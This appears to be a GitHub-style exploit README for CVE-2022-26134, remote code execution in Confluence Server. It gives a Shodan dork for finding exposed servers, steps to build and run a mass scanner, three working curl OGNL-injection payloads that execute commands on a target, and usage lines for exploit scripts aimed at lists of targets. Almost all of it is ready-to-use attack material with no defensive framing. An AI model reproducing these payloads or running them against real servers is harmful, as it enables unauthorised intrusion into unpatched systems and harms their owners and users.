# CVE-2022-26134
![](https://img.shields.io/static/v1?label=Product&message=Confluence%20Server&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=%20from%201.3.0%20before%207.4.17,%20from%207.13.0%20before%207.13.7,%20from%207.14.0%20before%207.14.3&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)


- Shodan dork
```
http.favicon.hash:-305179312
```
<!-- Here is an Easter Egg for inquiring minds
shodan-favicon-hashes - https://mega.nz/file/ctdH3LAB#lnE0GUkfCacwA18wR1VQI6TxIJ4OKM_6YKQdpHY4GN0
-->

- Scan hosts for vulnerability
```
git clone https://github.com/redhuntlabs/ConfluentPwn; cd ConfluentPwn
```
```
go build
```
```
./cfscan -h
```
```
Examples:
  ./cfscan 1.2.3.4:80 1.1.1.1:8080
  ./cfscan -file urls.txt
  ./cfscan -cmd 'nslookup xxxxxxxxxxxxxxxxx.canarytokens.com 1.1.1.1:80'
  ./cfscan -cmd 'ps' -regex '^\s*PID\s*TTY\s*TIME\s*CMD' http://1.1.1.1:443
```



- Curl PoC

```
curl -v http://target_IP:port/%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/
```
or
```
curl -v http://target_IP:port/${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-Cmd-Response",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("var d='';var i = java.lang.Runtime.getRuntime().exec('whoami').getInputStream(); while(i.available())d+=String.fromCharCode(i.read());d"))}/
```
or
```
curl -v http://target_IP:port/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
``` 
- Usage

Exploit single target
```
python3 exploit.py https://target.com CMD
```
```
python3 exploit2.py -u http://xxxxx.com -c id
```
Exploit multi-targets
```
python3 exploit2.py -f urls.txt -c id
```
